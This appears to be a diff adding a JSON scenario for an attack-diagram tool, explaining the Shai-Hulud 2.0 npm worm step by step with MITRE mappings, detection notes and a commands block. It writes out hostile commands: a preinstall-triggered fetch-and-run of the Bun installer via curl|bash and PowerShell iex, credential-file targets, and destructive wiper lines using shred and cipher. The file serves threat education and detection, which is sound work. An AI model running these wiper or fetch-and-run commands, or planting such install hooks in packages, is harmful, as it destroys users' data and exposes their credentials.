@@ -1,0 +1,455 @@
+{
+  "title": "Shai-Hulud 2.0 NPM Supply Chain Worm",
+  "description": "A sophisticated self-propagating worm targeting the npm ecosystem using 'Bring Your Own Runtime' evasion via Bun and GitHub-based exfiltration.",
+  "version": "3.0",
+  "viewport": {
+    "zoom": 0.8909593917342469,
+    "pan": {
+      "x": 66.86760175731354,
+      "y": 24.881890678645846
+    }
+  },
+  "shortDescription": "NPM worm via Bun runtime evasion",
+  "tags": [
+    "Supply_Chain",
+    "NPM",
+    "Bun",
+    "Worm",
+    "Credential_Dumping",
+    "GitHub_Abuse",
+    "Wiper",
+    "JavaScript",
+    "Persistence"
+  ],
+  "metadata": {
+    "descriptionHtml": "<p><strong>Shai-Hulud 2.0</strong> is a highly aggressive supply chain worm that compromised over 790 npm packages in November 2025. Unlike typical malicious packages, it employs a <strong>'Bring Your Own Runtime'</strong> strategy by dynamically installing the <span style='color:#ef4444;font-weight:bold;'>Bun</span> runtime to evade Node.js-based security heuristics.</p><p>The attack flow executes immediately during the <span style='color:#ef4444;font-weight:bold;'>preinstall</span> phase:</p><ol><li><strong>Infection</strong>: Victim runs <span style='color:#ef4444;font-weight:bold;'>npm install</span> on a compromised dependency.</li><li><strong>Evasion</strong>: The script <code>setup_bun.js</code> downloads and installs Bun, then detaches a massive (10MB+) obfuscated payload process.</li><li><strong>Harvesting</strong>: It scans the filesystem (using logic similar to TruffleHog) for AWS keys, NPM tokens, and GitHub credentials.</li><li><strong>Worming & Exfiltration</strong>: Stolen credentials are used to creating new malicious GitHub repositories (C2) and publish infected versions of the victim's own packages.</li><li><strong>Destruction</strong>: A 'Dead Man\\'s Switch' monitors connectivity; if blocked, it triggers a wiper (<span style='color:#ef4444;font-weight:bold;'>shred</span> or <span style='color:#ef4444;font-weight:bold;'>cipher</span>) to destroy user data.</li></ol>",
+    "commandsBlock": "# Step 1: Malicious preinstall triggers Bun setup\n$ npm install compromised-package\n\n# Step 2: Malware downloads Bun (Linux/Mac)\n$ curl -fsSL https://bun.sh/install | bash\n\n# Step 3: Malware downloads Bun (Windows)\n$ powershell -c \"irm bun.sh/install.ps1|iex\"\n\n# Step 4: Detached payload execution\n$ bun bun_environment.js\n\n# Step 5: Wiper execution (If C2 blocked)\n$ shred -uvz -n 1 /home/user/*\n$ cipher /W:%USERPROFILE%",
+    "prerequisites": [
+      "Victim installs a compromised npm package",
+      "Outbound network access to bun.sh and api.github.com",
+      "Credentials stored in standard locations (~/.aws, .env, .npmrc)"
+    ],
+    "attackerGains": [
+      "NPM publishing tokens for further propagation",
+      "GitHub PATs for repository access",
+      "AWS/Cloud credentials for resource hijacking",
+      "Persistent backdoor via self-hosted runners"
+    ],
+    "detectionNotes": [
+      "Process 'bun' spawned by 'node' or 'npm'",
+      "Network traffic to webhook.site/bb8ca5f6-...",
+      "Creation of GitHub repos with description 'Sha1-Hulud'",
+      "Large (>5MB) JavaScript files in node_modules"
+    ],
+    "mitreCategories": [
+      "T1195.001",
+      "T1059.007",
+      "T1552.001",
+      "T1567",
+      "T1485"
+    ],
+    "extraInfo": [
+      "MITRE T1195.001 - Supply Chain Compromise",
+      "MITRE T1059.007 - JavaScript Execution via Bun",
+      "MITRE T1485 - Data Destruction (Dead Man's Switch)",
+      "Bun Runtime - https://bun.sh",
+      "CVE-2025-54313 - Related compromise of eslint-config-prettier"
+    ]
+  },
+  "entities": [
+    {
+      "id": "attacker",
+      "label": "Threat Actor",
+      "position": {
+        "x": 68.1856358895229,
+        "y": 197.94835693298987
+      },
+      "icon": "IconAttacker",
+      "type": "node"
+    },
+    {
+      "id": "internet_zone",
+      "label": "Internet / Public Services",
+      "position": {
+        "x": 468.39845856418947,
+        "y": 153.93007770489885
+      },
+      "icon": "IconCloud",
+      "type": "container",
+      "width": 500,
+      "height": 200,
+      "style": "dashed_border",
+      "members": [
+        "npm_registry",
+        "github_api",
+        "bun_server",
+        "c2_webhook"
+      ]
+    },
+    {
+      "id": "npm_registry",
+      "label": "NPM Registry",
+      "position": {
+        "x": 300.929863131966,
+        "y": 77.35752246276027
+      },
+      "icon": "IconNpm",
+      "type": "node"
+    },
+    {
+      "id": "github_api",
+      "label": "GitHub API (C2)",
+      "position": {
+        "x": 630.867053996413,
+        "y": 79.35682458347634
+      },
+      "icon": "IconGitHub",
+      "type": "node"
+    },
+    {
+      "id": "bun_server",
+      "label": "bun.sh",
+      "position": {
+        "x": 534.9528931483356,
+        "y": 203.31355606787326
+      },
+      "icon": "IconServer",
+      "type": "node"
+    },
+    {
+      "id": "c2_webhook",
+      "label": "Webhook.site",
+      "position": {
+        "x": 430.01139783974645,
+        "y": 209.5026329470374
+      },
+      "icon": "IconC2",
+      "type": "node"
+    },
+    {
+      "id": "victim_workstation",
+      "label": "Victim Developer Machine",
+      "position": {
+        "x": 493.2387816944464,
+        "y": 559.7118361664621
+      },
+      "icon": "IconWorkstation",
+      "type": "container",
+      "width": 500,
+      "height": 400,
+      "style": "dashed_border",
+      "members": [
+        "victim_terminal",
+        "setup_script",
+        "bun_process",
+        "malware_payload",
+        "secrets_store",
+        "user_files"
+      ]
+    },
+    {
+      "id": "victim_terminal",
+      "label": "Terminal (npm)",
+      "position": {
+        "x": 239.53217991651812,
+        "y": 460.0256516472727
+      },
+      "icon": "IconTerminal",
+      "type": "node"
+    },
+    {
+      "id": "setup_script",
+      "label": "setup_bun.js",
+      "position": {
+        "x": 704.2431706930183,
+        "y": 480.03386836969435
+      },
+      "icon": "IconMalware",
+      "type": "node"
+    },
+    {
+      "id": "bun_process",
+      "label": "Bun Runtime",
+      "position": {
+        "x": 510.70619688715715,
+        "y": 520.746042569682
+      },
+      "icon": "IconInfectedProcess",
+      "type": "node"
+    },
+    {
+      "id": "malware_payload",
+      "label": "bun_environment.js",
+      "position": {
+        "x": 319.0434596262602,
+        "y": 557.4793109771729
+      },
+      "icon": "IconInfectedCode",
+      "type": "node"
+    },
+    {
+      "id": "secrets_store",
+      "label": "~/.aws & .npmrc",
+      "position": {
+        "x": 854.3612333614368,
+        "y": 638.3980206856515
+      },
+      "icon": "IconKey",
+      "type": "node"
+    },
+    {
+      "id": "user_files",
+      "label": "User Data",
+      "position": {
+        "x": 115.11633002745596,
+        "y": 589.8677312390821
+      },
+      "icon": "IconFolder",
+      "type": "node"
+    }
+  ],
+  "visibility": {
+    "internet_zone": {
+      "start": 0,
+      "end": 100
+    },
+    "victim_workstation": {
+      "start": 0,
+      "end": 100
+    },
+    "attacker": {
+      "start": 1,
+      "end": 100
+    },
+    "npm_registry": {
+      "start": 0,
+      "end": 100
+    },
+    "github_api": {
+      "start": 0,
+      "end": 100
+    },
+    "bun_server": {
+      "start": 0,
+      "end": 100
+    },
+    "c2_webhook": {
+      "start": 0,
+      "end": 100
+    },
+    "victim_terminal": {
+      "start": 0,
+      "end": 100
+    },
+    "secrets_store": {
+      "start": 0,
+      "end": 100
+    },
+    "user_files": {
+      "start": 0,
+      "end": 100
+    },
+    "setup_script": {
+      "start": 4,
+      "end": 100
+    },
+    "bun_process": {
+      "start": 7,
+      "end": 100
+    },
+    "malware_payload": {
+      "start": 8,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Publish infected package",
+      "mitre": {
+        "id": "T1195.001",
+        "tactic": "Initial Access",
+        "technique": "Supply Chain Compromise"
+      },
+      "type": "edge",
+      "from": "attacker",
+      "to": "npm_registry",
+      "icon": "IconNpm",
+      "tooltip": "Attacker publishes trojanized package with malicious preinstall script",
+      "cli": "npm publish malicious-package"
+    },
+    {
+      "id": 2,
+      "name": "npm install (Request)",
+      "mitre": {
+        "id": "T1204.002",
+        "tactic": "Execution",
+        "technique": "User Execution"
+      },
+      "type": "edge",
+      "from": "victim_terminal",
+      "to": "npm_registry",
+      "icon": "IconNpm",
+      "tooltip": "Victim developer requests package installation",
+      "cli": "npm install malicious-package"
+    },
+    {
+      "id": 3,
+      "name": "Download package",
+      "mitre": {
+        "id": "T1195.001",
+        "tactic": "Initial Access",
+        "technique": "Supply Chain Compromise"
+      },
+      "type": "edge",
+      "from": "npm_registry",
+      "to": "victim_terminal",
+      "icon": "IconInfectedPackage",
+      "tooltip": "Compromised package containing setup_bun.js is downloaded"
+    },
+    {
+      "id": 4,
+      "name": "Trigger preinstall hook",
+      "mitre": {
+        "id": "T1059.007",
+        "tactic": "Execution",
+        "technique": "JavaScript Execution"
+      },
+      "type": "edge",
+      "from": "victim_terminal",
+      "to": "setup_script",
+      "icon": "IconTerminal",
+      "tooltip": "package.json preinstall script executes immediately",
+      "cli": "node setup_bun.js"
+    },
+    {
+      "id": 5,
+      "name": "Request Bun runtime",
+      "mitre": {
+        "id": "T1105",
+        "tactic": "Command and Control",
+        "technique": "Ingress Tool Transfer"
+      },
+      "type": "edge",
+      "from": "setup_script",
+      "to": "bun_server",
+      "icon": "IconServer",
+      "tooltip": "Dropper script requests Bun installer script from bun.sh",
+      "cli": "curl -fsSL https://bun.sh/install"
+    },
+    {
+      "id": 6,
+      "name": "Download Bun",
+      "mitre": {
+        "id": "T1027",
+        "tactic": "Defense Evasion",
+        "technique": "Obfuscated Files or Information"
+      },
+      "type": "edge",
+      "from": "bun_server",
+      "to": "setup_script",
+      "icon": "IconProcess",
+      "tooltip": "Bun runtime binary is downloaded and installed to bypass Node.js monitoring"
+    },
+    {
+      "id": 7,
+      "name": "Spawn detached payload",
+      "mitre": {
+        "id": "T1569",
+        "tactic": "Execution",
+        "technique": "System Services"
+      },
+      "type": "edge",
+      "from": "setup_script",
+      "to": "bun_process",
+      "icon": "IconInfectedProcess",
+      "tooltip": "Setup script spawns Bun to run the massive obfuscated payload",
+      "cli": "bun bun_environment.js"
+    },
+    {
+      "id": 8,
+      "name": "Load malware logic",
+      "mitre": {
+        "id": "T1027",
+        "tactic": "Defense Evasion",
+        "technique": "Obfuscated Files or Information"
+      },
+      "type": "edge",
+      "from": "bun_process",
+      "to": "malware_payload",
+      "icon": "IconInfectedCode",
+      "tooltip": "The 10MB+ payload (bun_environment.js) is loaded into memory"
+    },
+    {
+      "id": 9,
+      "name": "Beacon Check-in",
+      "mitre": {
+        "id": "T1071.001",
+        "tactic": "Command and Control",
+        "technique": "Web Protocols"
+      },
+      "type": "edge",
+      "from": "malware_payload",
+      "to": "c2_webhook",
+      "icon": "IconC2",
+      "tooltip": "Malware signals successful infection to attacker webhook"
+    },
+    {
+      "id": 10,
+      "name": "Harvest credentials",
+      "mitre": {
+        "id": "T1552.001",
+        "tactic": "Credential Access",
+        "technique": "Credentials In Files"
+      },
+      "type": "edge",
+      "from": "malware_payload",
+      "to": "secrets_store",
+      "icon": "IconSearch",
+      "tooltip": "TruffleHog-like logic scans filesystem for AWS keys, npm tokens, and SSH keys"
+    },
+    {
+      "id": 11,
+      "name": "Exfiltrate to GitHub",
+      "mitre": {
+        "id": "T1567.001",
+        "tactic": "Exfiltration",
+        "technique": "Exfiltration to Code Repository"
+      },
+      "type": "edge",
+      "from": "secrets_store",
+      "to": "github_api",
+      "icon": "IconStolenKey",
+      "tooltip": "Secrets are pushed to a new, random GitHub repo created via API using stolen/attacker tokens"
+    },
+    {
+      "id": 12,
+      "name": "Retrieve data",
+      "mitre": {
+        "id": "T1530",
+        "tactic": "Collection",
+        "technique": "Data from Cloud Storage"
+      },
+      "type": "edge",
+      "from": "github_api",
+      "to": "attacker",
+      "icon": "IconStolenCredential",
+      "tooltip": "Attacker retrieves harvested credentials from the drop-box repository"
+    },
+    {
+      "id": 13,
+      "name": "Dead Man's Switch (Wipe)",
+      "mitre": {
+        "id": "T1485",
+        "tactic": "Impact",
+        "technique": "Data Destruction"
+      },
+      "type": "edge",
+      "from": "malware_payload",
+      "to": "user_files",
+      "icon": "IconExploit",
+      "tooltip": "If C2 connection is blocked, wiper destroys user data to hinder forensics",
+      "cli": "shred -uvz -n 1 /home/user/*"
+    }
+  ]
+}
